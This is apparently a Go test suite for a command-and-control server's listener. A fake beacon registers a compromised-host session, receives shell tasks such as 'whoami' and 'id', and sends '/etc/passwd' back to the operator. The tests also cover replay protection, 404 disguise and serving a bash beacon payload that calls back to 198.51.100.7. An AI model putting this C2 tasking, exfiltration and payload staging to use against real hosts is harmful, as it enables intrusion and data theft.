package c2center

// 监听器集成测试:httptest 风格起「真监听器」(127.0.0.1 随机端口),用 Seal/Open
// 模拟 beacon 走 reg → 下发 shell(假执行)→ res → files_list/pull/push 全链路;
// 外加防重放 / 时间窗 / 错误密钥 404 / 载荷投递 / 长轮询用例。全程不连库。

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func quietLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// newTestListener 装配「监听器 + fake store + 32B 密钥」,尚未启动。
func newTestListener(t *testing.T) (*Manager, *fakeStore, []byte, *Listener) {
	t.Helper()
	st := newFakeStore()
	key := testKey()
	l := st.addListener("t1", "abc", 0, true, key)
	mgr := NewManager(st, quietLogger())
	mgr.BaseDir = t.TempDir()
	return mgr, st, key, l
}

func startListener(t *testing.T, mgr *Manager, l *Listener) string {
	t.Helper()
	if err := mgr.StartListener(l); err != nil {
		t.Fatalf("StartListener: %v", err)
	}
	t.Cleanup(func() { _ = mgr.StopListener(l.ID) })
	return "http://" + mgr.ListenerAddr(l.ID)
}

// rawEnvelope 是测试侧的响应信封(d 保持原始字节,便于断言直通语义)。
type rawEnvelope struct {
	Type string          `json:"t"`
	Meta RespMeta        `json:"meta"`
	Data json.RawMessage `json:"d"`
}

type testBeacon struct {
	t       *testing.T
	key     []byte
	sid     string
	base    string
	urlPath string
	client  *http.Client
}

func newBeacon(t *testing.T, key []byte, base, urlPath string) *testBeacon {
	return &testBeacon{
		t: t, key: key, base: base, urlPath: urlPath,
		client: &http.Client{Timeout: 40 * time.Second},
	}
}

func (b *testBeacon) endpoint() string {
	if b.urlPath == "" {
		return b.base + "/e"
	}
	return b.base + "/" + b.urlPath + "/e"
}

// post 加封、编码、发送并解封响应(2xx 时);非 2xx 只回状态码。
func (b *testBeacon) post(key []byte, env RequestEnvelope) (int, rawEnvelope) {
	b.t.Helper()
	sealed, err := Seal(key, mustJSON(env))
	if err != nil {
		b.t.Fatalf("Seal: %v", err)
	}
	return b.postRaw(base64.StdEncoding.EncodeToString(sealed))
}

// postRaw 发原始 body,返回状态码;2xx 时同时解出响应信封(用 beacon 密钥)。
func (b *testBeacon) postRaw(body string) (code int, env rawEnvelope) {
	b.t.Helper()
	resp, err := b.client.Post(b.endpoint(), "application/octet-stream", strings.NewReader(body))
	if err != nil {
		b.t.Fatalf("POST: %v", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		return resp.StatusCode, rawEnvelope{}
	}
	// 线格式:body = base64(sealed)。
	sealed, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(string(raw)))
	if derr != nil {
		b.t.Fatalf("响应 b64 解码失败: %v", derr)
	}
	plain, err := Open(b.key, sealed)
	if err != nil {
		b.t.Fatalf("Open 响应失败: %v", err)
	}
	if err := json.Unmarshal(plain, &env); err != nil {
		b.t.Fatalf("响应信封解析失败: %v", err)
	}
	return resp.StatusCode, env
}

// call 构造新鲜信封(ts=now,nc 随机)并发送。
func (b *testBeacon) call(typ string, d any) (int, rawEnvelope) {
	b.t.Helper()
	env := RequestEnvelope{Type: typ, SID: b.sid, TS: time.Now().Unix(), NC: newTestNC()}
	if d != nil {
		env.Data = mustJSON(d)
	}
	return b.post(b.key, env)
}

func mustJSON(v any) json.RawMessage {
	raw, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return raw
}

func newTestNC() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return hex.EncodeToString(b)
}

func decodeData(t *testing.T, env rawEnvelope, target any) {
	t.Helper()
	if len(env.Data) == 0 {
		t.Fatalf("响应缺 d")
	}
	if err := json.Unmarshal(env.Data, target); err != nil {
		t.Fatalf("解码 d 失败: %v", err)
	}
}

// beaconReg 用给定身份完成一次 reg,返回新 sid。
func beaconReg(b *testBeacon, listenerID int64, hn, us, osn string) string {
	b.t.Helper()
	uid := BeaconUID(listenerID, hn, us, osn)
	code, env := b.call(TypeReg, RegPayload{
		UID: uid, Hostname: hn, Username: us, Elevated: true,
		OS: osn, Arch: "amd64", IP: "10.0.0.5", PID: 4242, Process: "cmd.exe",
	})
	if code != http.StatusOK || env.Type != TypeAck {
		b.t.Fatalf("reg 失败: code=%d type=%s", code, env.Type)
	}
	var ack AckPayload
	decodeData(b.t, env, &ack)
	if len(ack.SID) != 32 {
		b.t.Fatalf("sid 长度 %d,应为 32 hex", len(ack.SID))
	}
	b.sid = ack.SID
	return ack.SID
}

// ---- 全链路 ----

func TestFullChain(t *testing.T) {
	mgr, st, key, l := newTestListener(t)
	mgr.PollWait = 300 * time.Millisecond // 全链路里空队列的合并 res/poll 不必挂满 25s
	base := startListener(t, mgr, l)
	b := newBeacon(t, key, base, "abc")

	// 1. reg 上线。
	sid := beaconReg(b, 1, "host1", "alice", "windows")
	sess, err := st.GetSessionBySID(sid)
	if err != nil || sess == nil {
		t.Fatalf("会话未入库: %v", err)
	}
	if sess.Status != StatusOnline || sess.ID == 0 {
		t.Fatalf("会话状态异常: %+v", sess)
	}
	if sess.BeaconUID != BeaconUID(1, "host1", "alice", "windows") {
		t.Fatalf("beacon_uid 不符: %s", sess.BeaconUID)
	}
	if sess.Hostname != "host1" || sess.Username != "alice" || !sess.Elevated ||
		sess.OS != "windows" || sess.Arch != "amd64" || sess.LocalIPs != "10.0.0.5" ||
		sess.PID != 4242 || sess.Process != "cmd.exe" {
		t.Fatalf("主机档案不符: %+v", sess)
	}
	if sess.SleepSec != defaultSleepSec || sess.JitterPct != defaultJitterPct {
		t.Fatalf("默认 sleep/jitter 不符: %+v", sess)
	}

	// 2. 下发 shell 任务 → poll 取走。
	taskID, err := st.CreateTask(TaskInput{SessionID: sess.ID, Kind: "shell",
		Input: `{"command":"whoami"}`, Actor: "user", CreatedBy: "tester"})
	if err != nil {
		t.Fatalf("CreateTask: %v", err)
	}
	code, env := b.call(TypePoll, nil)
	if code != http.StatusOK || env.Type != TypeTasks {
		t.Fatalf("poll 失败: code=%d type=%s", code, env.Type)
	}
	if env.Meta.SleepSec != defaultSleepSec || env.Meta.Kill {
		t.Fatalf("meta 不符: %+v", env.Meta)
	}
	var tp TasksPayload
	decodeData(t, env, &tp)
	if len(tp.Tasks) != 1 || tp.Tasks[0].ID != taskID || tp.Tasks[0].Kind != "shell" ||
		tp.Tasks[0].Input != `{"command":"whoami"}` {
		t.Fatalf("任务下发不符: %+v", tp.Tasks)
	}
	if got, _ := st.GetTask(taskID); got.Status != TaskSent || got.SentAt == nil {
		t.Fatalf("任务应已置 sent: %+v", got)
	}

	// 3. res 回结果(假执行器输出),响应合并下一批任务(此处为空数组非 null)。
	//    同时再挂一个 queued 任务,验证 res 可顺路取走(合并语义)。
	task2, _ := st.CreateTask(TaskInput{SessionID: sess.ID, Kind: "shell",
		Input: `{"command":"id"}`, Actor: "user", CreatedBy: "tester"})
	out := []byte("alice\\work")
	code, env = b.call(TypeRes, ResPayload{Results: []ResResult{{
		TaskID: taskID, Status: TaskDone, Output: out,
	}}})
	if code != http.StatusOK || env.Type != TypeTasks {
		t.Fatalf("res 失败: code=%d type=%s", code, env.Type)
	}
	decodeData(t, env, &tp)
	if len(tp.Tasks) != 1 || tp.Tasks[0].ID != task2 {
		t.Fatalf("res 应顺路取走 task2: %+v", tp.Tasks)
	}
	got, _ := st.GetTask(taskID)
	if got.Status != TaskDone || got.Output != string(out) || got.OutputSize != int64(len(out)) || got.OutputPath != "" {
		t.Fatalf("小输出应存表内全文: %+v", got)
	}
	// task2 已被取走,回结果后队列空,ts 仍是非 nil 空数组。
	code, env = b.call(TypeRes, ResPayload{Results: []ResResult{{
		TaskID: task2, Status: TaskError, ErrText: "boom",
	}}})
	decodeData(t, env, &tp)
	if tp.Tasks == nil || len(tp.Tasks) != 0 {
		t.Fatalf("空任务队列应为空数组: %#v", tp.Tasks)
	}
	got, _ = st.GetTask(task2)
	if got.Status != TaskError || got.Error != "boom" || got.DoneAt == nil {
		t.Fatalf("task2 终态不符: %+v", got)
	}

	// 4. 大输出落盘。
	bigTask, _ := st.CreateTask(TaskInput{SessionID: sess.ID, Kind: "shell", Input: `{"command":"dump"}`})
	if _, env = b.call(TypePoll, nil); env.Type != TypeTasks {
		t.Fatalf("poll big 失败")
	}
	big := make([]byte, MaxOutputInline+4096)
	for i := range big {
		big[i] = byte(i % 251)
	}
	code, env = b.call(TypeRes, ResPayload{Results: []ResResult{{
		TaskID: bigTask, Status: TaskDone, Output: big,
	}}})
	if code != http.StatusOK {
		t.Fatalf("res big 失败: %d", code)
	}
	got, _ = st.GetTask(bigTask)
	wantPath := filepath.Join(mgr.BaseDir, "c2", "outputs", fmt.Sprintf("task_%d.txt", bigTask))
	if got.OutputPath != wantPath {
		t.Fatalf("落盘路径不符: %s", got.OutputPath)
	}
	if got.OutputSize != int64(len(big)) {
		t.Fatalf("output_size 不符: %d", got.OutputSize)
	}
	if len(got.Output) != OutputPreviewBytes {
		t.Fatalf("表内预览应 %d 字节,得到 %d", OutputPreviewBytes, len(got.Output))
	}
	disk, rerr := os.ReadFile(wantPath)
	if rerr != nil || !bytes.Equal(disk, big) {
		t.Fatalf("落盘内容不符: err=%v len=%d", rerr, len(disk))
	}

	// 5. files_list:poll 取任务 → file/ls 上报条目(直通回显),任务在 ls 时收尾。
	lsTask, _ := st.CreateTask(TaskInput{SessionID: sess.ID, Kind: "files_list",
		Input: `{"path":"C:/data"}`})
	b.call(TypePoll, nil)
	entriesJSON := `[{"n":"a.txt","s":3,"d":false,"m":1690000000},{"n":"sub","s":0,"d":true,"m":1690000001}]`
	code, env = b.call(TypeFile, FilePayload{Action: "ls", Path: "C:/data",
		Entries: json.RawMessage(entriesJSON)})
	if code != http.StatusOK || env.Type != TypeFile {
		t.Fatalf("file/ls 失败: code=%d type=%s", code, env.Type)
	}
	var esWrap struct {
		ES json.RawMessage `json:"es"`
	}
	decodeData(t, env, &esWrap)
	if string(bytes.TrimSpace(esWrap.ES)) != entriesJSON {
		t.Fatalf("es 应字节级直通: %s", esWrap.ES)
	}
	gotLs, _ := st.GetTask(lsTask)
	if gotLs.Status != TaskDone || gotLs.Output != entriesJSON ||
		gotLs.OutputSize != int64(len(entriesJSON)) {
		t.Fatalf("files_list 任务收尾不符: %+v", gotLs)
	}

	// 6. upload(up):平台 blob 分片被 pull 走,发完置 done。
	blob := make([]byte, 300*1024)
	for i := range blob {
		blob[i] = byte(i % 251)
	}
	tf1, _ := st.CreateTransfer(TransferInput{SessionID: sess.ID, Direction: DirectionUp,
		RemotePath: `C:\data\pw.bin`, Size: int64(len(blob))})
	blobPath := filepath.Join(mgr.BaseDir, "c2", "uploads", fmt.Sprintf("%d.bin", tf1))
	if err := os.MkdirAll(filepath.Dir(blobPath), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(blobPath, blob, 0o644); err != nil {
		t.Fatalf("写 blob: %v", err)
	}
	code, env = b.call(TypeFile, FilePayload{Action: "pull", TransferID: tf1,
		Path: `C:\data\pw.bin`, Offset: 0, Length: 0})
	var pp PullPayload
	decodeData(t, env, &pp)
	if code != http.StatusOK || len(pp.Data) != FileChunkSize || pp.EOF {
		t.Fatalf("第一片不符: code=%d len=%d eof=%v", code, len(pp.Data), pp.EOF)
	}
	chunk1 := append([]byte(nil), pp.Data...)
	if tr, _ := st.GetTransfer(tf1); tr.Status != "running" || tr.DoneSize != FileChunkSize {
		t.Fatalf("传输进度不符: %+v", tr)
	}
	code, env = b.call(TypeFile, FilePayload{Action: "pull", TransferID: tf1,
		Offset: FileChunkSize, Length: 0})
	decodeData(t, env, &pp)
	if code != http.StatusOK || len(pp.Data) != len(blob)-FileChunkSize || !pp.EOF {
		t.Fatalf("第二片不符: len=%d eof=%v", len(pp.Data), pp.EOF)
	}
	if tr, _ := st.GetTransfer(tf1); tr.Status != "done" || tr.DoneAt == nil {
		t.Fatalf("up 传输应收尾 done: %+v", tr)
	}
	if !bytes.Equal(append(append([]byte{}, chunk1...), pp.Data...), blob) {
		t.Fatalf("分片重组不符")
	}

	// 7. download(down):push 两片落 downloads/,eof 时 done + local_path。
	tf2, _ := st.CreateTransfer(TransferInput{SessionID: sess.ID, Direction: DirectionDown,
		RemotePath: "/etc/passwd"})
	part1 := bytes.Repeat([]byte{0xAB}, 1000)
	part2 := bytes.Repeat([]byte{0xCD}, 500)
	code, env = b.call(TypeFile, FilePayload{Action: "push", TransferID: tf2,
		Path: "/etc/passwd", Offset: 0, Data: part1, EOF: false})
	if code != http.StatusOK {
		t.Fatalf("push#1 失败: %d", code)
	}
	var pushAck PushPayload
	decodeData(t, env, &pushAck)
	code, env = b.call(TypeFile, FilePayload{Action: "push", TransferID: tf2,
		Path: "/etc/passwd", Offset: int64(len(part1)), Data: part2, EOF: true})
	if code != http.StatusOK {
		t.Fatalf("push#2 失败: %d", code)
	}
	downPath := filepath.Join(mgr.BaseDir, "c2", "downloads", fmt.Sprintf("%d.bin", tf2))
	diskDown, rerr := os.ReadFile(downPath)
	if rerr != nil || !bytes.Equal(diskDown, append(append([]byte{}, part1...), part2...)) {
		t.Fatalf("down 产物不符: err=%v", rerr)
	}
	if tr, _ := st.GetTransfer(tf2); tr.Status != "done" || tr.DoneSize != int64(len(part1)+len(part2)) ||
		st.transferLocalPath(tf2) != downPath || tr.DoneAt == nil {
		t.Fatalf("down 传输收尾不符: %+v local_path=%q", tr, st.transferLocalPath(tf2))
	}

	// 8. 方向/归属校验:down 不可 pull、up 不可 push、他人 transfer 不可碰。
	if code, _ = b.call(TypeFile, FilePayload{Action: "pull", TransferID: tf2, Offset: 0}); code != http.StatusBadRequest {
		t.Fatalf("down 传输 pull 应 400: %d", code)
	}
	if code, _ = b.call(TypeFile, FilePayload{Action: "push", TransferID: tf1, Offset: 0, Data: []byte("x")}); code != http.StatusBadRequest {
		t.Fatalf("up 传输 push 应 400: %d", code)
	}
	tf3, _ := st.CreateTransfer(TransferInput{SessionID: sess.ID + 999, Direction: DirectionDown})
	if code, _ = b.call(TypeFile, FilePayload{Action: "push", TransferID: tf3, Offset: 0, Data: []byte("x")}); code != http.StatusBadRequest {
		t.Fatalf("他人 transfer 应 400: %d", code)
	}

	// 9. 终止会话:poll 立即回 kl=true,会话保持 dead 且不心跳。
	if err := st.SetSessionStatusBySID(sid, StatusDead); err != nil {
		t.Fatalf("置 dead: %v", err)
	}
	code, env = b.call(TypePoll, nil)
	if code != http.StatusOK || !env.Meta.Kill {
		t.Fatalf("dead 会话应回 kl=true: code=%d meta=%+v", code, env.Meta)
	}
	decodeData(t, env, &tp)
	if len(tp.Tasks) != 0 {
		t.Fatalf("dead 会话不应派任务: %+v", tp.Tasks)
	}
	if cur, _ := st.GetSessionBySID(sid); cur.Status != StatusDead {
		t.Fatalf("dead 会话不应被心跳复活: %+v", cur)
	}

	// 10. 心跳超时 → sweep 置 offline;下次心跳自动复位 online。
	uid2 := BeaconUID(1, "hostB", "bob", "linux")
	code, env = b.call(TypeReg, RegPayload{UID: uid2, Hostname: "hostB", Username: "bob",
		OS: "linux", Arch: "amd64", IP: "10.0.0.6", PID: 7, Process: "sh"})
	if code != http.StatusOK || env.Type != TypeAck {
		t.Fatalf("hostB reg 失败")
	}
	var ack AckPayload
	decodeData(t, env, &ack)
	sid2 := ack.SID
	if err := st.SetSessionSleep(sid2, 1, 0); err != nil {
		t.Fatalf("调 sleep: %v", err)
	}
	st.setLastSeen(sid2, time.Now().Add(-60*time.Second))
	mgr.sweepOnce()
	if cur, _ := st.GetSessionBySID(sid2); cur.Status != StatusOffline {
		t.Fatalf("超时会话应被 sweep 置 offline: %+v", cur)
	}
	b.sid = sid2
	if code, _ = b.call(TypePoll, nil); code != http.StatusOK {
		t.Fatalf("offline 会话心跳失败")
	}
	if cur, _ := st.GetSessionBySID(sid2); cur.Status != StatusOnline {
		t.Fatalf("心跳应复位 online: %+v", cur)
	}

	// 11. reg 幂等复活(同一 beacon 重连 = 同一会话,换新 sid)。
	b2 := newBeacon(t, key, base, "abc")
	code, env = b2.call(TypeReg, RegPayload{UID: uid2, Hostname: "hostB", Username: "bob",
		OS: "linux", Arch: "amd64", IP: "10.0.0.6", PID: 7, Process: "sh"})
	if code != http.StatusOK {
		t.Fatalf("重复 reg 失败")
	}
	var ack2 AckPayload
	decodeData(t, env, &ack2)
	if cur, _ := st.GetSessionBySID(ack2.SID); cur == nil || cur.ID == 0 {
		t.Fatalf("重连应复用会话行: %+v", cur)
	} else if n := countSessionsByUID(st, uid2); n != 1 {
		t.Fatalf("listener_id+beacon_uid 应幂等(一行),实际 %d 行", n)
	}
}

func countSessionsByUID(st *fakeStore, uid string) int {
	st.mu.Lock()
	defer st.mu.Unlock()
	n := 0
	for _, s := range st.sessions {
		if s.BeaconUID == uid {
			n++
		}
	}
	return n
}

// ---- 认证与安全 ----

func TestListenerAuthFailures(t *testing.T) {
	mgr, _, key, l := newTestListener(t)
	mgr.PollWait = 200 * time.Millisecond // 合法但无任务的 poll 会挂长轮询,测试不必等 25s
	base := startListener(t, mgr, l)
	b := newBeacon(t, key, base, "abc")
	beaconReg(b, 1, "host1", "alice", "windows")

	// 同 NC 重放:第一次 200,第二次 404。
	env := RequestEnvelope{Type: TypePoll, SID: b.sid, TS: time.Now().Unix(), NC: "fixed-nc"}
	if code, _ := b.post(b.key, env); code != http.StatusOK {
		t.Fatalf("首发应 200: %d", code)
	}
	if code, _ := b.post(b.key, env); code != http.StatusNotFound {
		t.Fatalf("同 NC 重放应 404: %d", code)
	}
	// reg 路径同 NC 重放(按 uid 记账)。
	regEnv := RequestEnvelope{Type: TypeReg, TS: time.Now().Unix(), NC: "fixed-reg",
		Data: mustJSON(RegPayload{UID: BeaconUID(1, "r", "r", "windows")})}
	if code, _ := b.post(b.key, regEnv); code != http.StatusOK {
		t.Fatalf("reg 首发应 200: %d", code)
	}
	if code, _ := b.post(b.key, regEnv); code != http.StatusNotFound {
		t.Fatalf("reg 重放应 404: %d", code)
	}

	// ts 过期/超前。
	stale := RequestEnvelope{Type: TypePoll, SID: b.sid, TS: time.Now().Unix() - 601, NC: newTestNC()}
	if code, _ := b.post(b.key, stale); code != http.StatusNotFound {
		t.Fatalf("ts 过期应 404: %d", code)
	}
	future := RequestEnvelope{Type: TypePoll, SID: b.sid, TS: time.Now().Unix() + 601, NC: newTestNC()}
	if code, _ := b.post(b.key, future); code != http.StatusNotFound {
		t.Fatalf("ts 超前应 404: %d", code)
	}

	// 错误密钥。
	other := testKey()
	other[0] ^= 0xff
	wrongKey := RequestEnvelope{Type: TypePoll, SID: b.sid, TS: time.Now().Unix(), NC: newTestNC()}
	sealedWrong, err := Seal(other, mustJSON(wrongKey))
	if err != nil {
		t.Fatalf("Seal: %v", err)
	}
	if code, _ := b.postRaw(base64.StdEncoding.EncodeToString(sealedWrong)); code != http.StatusNotFound {
		t.Fatalf("错误密钥应 404: %d", code)
	}

	// 垃圾 body / 非法 b64。
	if code, _ := b.postRaw("not base64 !!!"); code != http.StatusNotFound {
		t.Fatalf("非法 b64 应 404: %d", code)
	}
	sealed, _ := Seal(key, []byte("{not json"))
	// 密文合法但信封 JSON 非法:认证已通过,属协议层错误 → 400(与 404 伪装不冲突)。
	if code, _ := b.postRaw(base64.StdEncoding.EncodeToString(sealed)); code != http.StatusBadRequest {
		t.Fatalf("坏信封 JSON 应 400: %d", code)
	}

	// 未知路径 / 错误方法。
	resp, err := b.client.Post(base+"/nope/e", "application/octet-stream", strings.NewReader("x"))
	if err != nil {
		t.Fatalf("POST: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("未知路径应 404: %d", resp.StatusCode)
	}
	gresp, err := b.client.Get(b.endpoint())
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	gresp.Body.Close()
	if gresp.StatusCode != http.StatusNotFound {
		t.Fatalf("GET 信道应 404: %d", gresp.StatusCode)
	}

	// 未知 sid。
	b.sid = "no-such-sid"
	if code, _ := b.call(TypePoll, nil); code != http.StatusNotFound {
		t.Fatalf("未知 sid 应 404: %d", code)
	}
	b.sid = ""

	// 超限 body(8MB 上限)。
	if code, _ := b.postRaw(strings.Repeat("A", MaxBodyBytes+1024)); code != http.StatusNotFound {
		t.Fatalf("超限 body 应 404: %d", code)
	}
}

// ---- 长轮询 ----

func TestLongPollWakeup(t *testing.T) {
	mgr, st, key, l := newTestListener(t)
	mgr.PollWait = 2 * time.Second
	base := startListener(t, mgr, l)
	b := newBeacon(t, key, base, "abc")
	sid := beaconReg(b, 1, "host1", "alice", "windows")
	sess, _ := st.GetSessionBySID(sid)

	go func() {
		time.Sleep(300 * time.Millisecond)
		_, _ = st.CreateTask(TaskInput{SessionID: sess.ID, Kind: "shell", Input: `{"command":"id"}`})
	}()
	start := time.Now()
	code, env := b.call(TypePoll, nil)
	elapsed := time.Since(start)
	if code != http.StatusOK {
		t.Fatalf("poll: %d", code)
	}
	var tp TasksPayload
	decodeData(t, env, &tp)
	if len(tp.Tasks) != 1 {
		t.Fatalf("任务应被唤醒取走: %+v", tp.Tasks)
	}
	if elapsed >= 2*time.Second {
		t.Fatalf("应远早于 PollWait 返回: %v", elapsed)
	}
}

func TestLongPollTimeout(t *testing.T) {
	mgr, _, key, l := newTestListener(t)
	mgr.PollWait = 400 * time.Millisecond
	base := startListener(t, mgr, l)
	b := newBeacon(t, key, base, "abc")
	beaconReg(b, 1, "host1", "alice", "windows")

	start := time.Now()
	code, env := b.call(TypePoll, nil)
	elapsed := time.Since(start)
	if code != http.StatusOK {
		t.Fatalf("poll: %d", code)
	}
	var tp TasksPayload
	decodeData(t, env, &tp)
	if tp.Tasks == nil || len(tp.Tasks) != 0 {
		t.Fatalf("空轮询应返回空数组: %#v", tp.Tasks)
	}
	if elapsed < 350*time.Millisecond || elapsed > 5*time.Second {
		t.Fatalf("空轮询应挂满 PollWait 返回: %v", elapsed)
	}
}

// ---- 载荷投递 ----

func TestPayloadDelivery(t *testing.T) {
	mgr, st, key, l := newTestListener(t)
	base := startListener(t, mgr, l)
	l.Callback = "http://198.51.100.7:8443"

	_, content, _, err := RenderPayload("bash", "linux", l, key)
	if err != nil {
		t.Fatalf("RenderPayload: %v", err)
	}
	payloadDir := filepath.Join(mgr.BaseDir, "c2", "payloads")
	if err := os.MkdirAll(payloadDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// 模拟 server 落盘(推荐约定 <id>_<filename>,另验 <token> 命名兜底)。
	if err := os.WriteFile(filepath.Join(payloadDir, fmt.Sprintf("1_%s", "beacon_1.sh")), content, 0o644); err != nil {
		t.Fatalf("落盘: %v", err)
	}
	if _, err := st.CreatePayload(PayloadInput{ListenerID: 1, Token: "tok123",
		Format: "bash", Target: "linux", Size: int64(len(content))}); err != nil {
		t.Fatalf("CreatePayload: %v", err)
	}

	resp, err := http.Get(base + "/abc/p/tok123")
	if err != nil {
		t.Fatalf("GET 投递: %v", err)
	}
	raw, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || !bytes.Equal(raw, content) {
		t.Fatalf("投递内容不符: code=%d len=%d", resp.StatusCode, len(raw))
	}

	resp, _ = http.Get(base + "/abc/p/wrong-token")
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("错误 token 应 404: %d", resp.StatusCode)
	}

	// 其它监听器的载荷:token 对但归属不符 → 404。
	if _, err := st.CreatePayload(PayloadInput{ListenerID: 99, Token: "tok99"}); err != nil {
		t.Fatalf("CreatePayload: %v", err)
	}
	resp, _ = http.Get(base + "/abc/p/tok99")
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("他人载荷应 404: %d", resp.StatusCode)
	}

	// <token> 命名约定兜底。
	if err := os.WriteFile(filepath.Join(payloadDir, "tok777"), []byte("x"), 0o644); err != nil {
		t.Fatalf("落盘: %v", err)
	}
	if _, err := st.CreatePayload(PayloadInput{ListenerID: 1, Token: "tok777"}); err != nil {
		t.Fatalf("CreatePayload: %v", err)
	}
	resp, _ = http.Get(base + "/abc/p/tok777")
	raw, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || string(raw) != "x" {
		t.Fatalf("token 命名兜底不符: code=%d body=%q", resp.StatusCode, raw)
	}
}
